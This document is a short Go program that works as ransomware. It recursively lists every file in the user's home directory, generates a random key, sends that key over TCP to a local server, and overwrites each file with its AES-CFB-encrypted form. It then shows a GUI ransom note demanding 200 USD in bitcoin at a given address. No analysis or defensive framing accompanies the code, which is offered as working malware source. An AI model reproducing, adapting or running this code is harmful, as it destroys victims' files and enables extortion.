package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"keys"
	"net"
	"os"
	"path/filepath"

	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func main() {
	var home_dir string
	home_dir, _ = os.UserHomeDir()
	var allfiles []string = ListAllfiles(home_dir)
	passwd, err := keys.Generate(32, 10, 10, false, false)
	if err != nil {
		panic(err)
	}
	key := []byte(passwd)
	sock, err := net.Dial("tcp", "127.0.0.1:3000")
	if err != nil {
		panic(err)
	}
	sock.Write(key)
	for i := 0; i < len(allfiles); i++ {
		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err)
		}
		plaintext, err := os.ReadFile(allfiles[i])
		if err != nil {
			continue
		}
		ciphertext := make([]byte, aes.BlockSize+len(plaintext))
		iv := ciphertext[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			panic(err)
		}
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
		os.WriteFile(allfiles[i], ciphertext, 0777)
	}
	a := app.New()
	w := a.NewWindow("Hello There")

	hello := widget.NewLabel("Ooops! All your files has been encrypted to get them back send 200 USD to the bitcoin address bellow and contact us at @ with your transaction id")
	w.SetContent(container.NewVBox(
		hello,
		widget.NewButton("bitcoin address: 17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR", func() {
			hello.SetText("Don't forget to contact us at @ with your transaction id")
		}),
	))

	w.ShowAndRun()
}
func ListAllfiles(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			return filepath.SkipDir
		}
		if !info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}
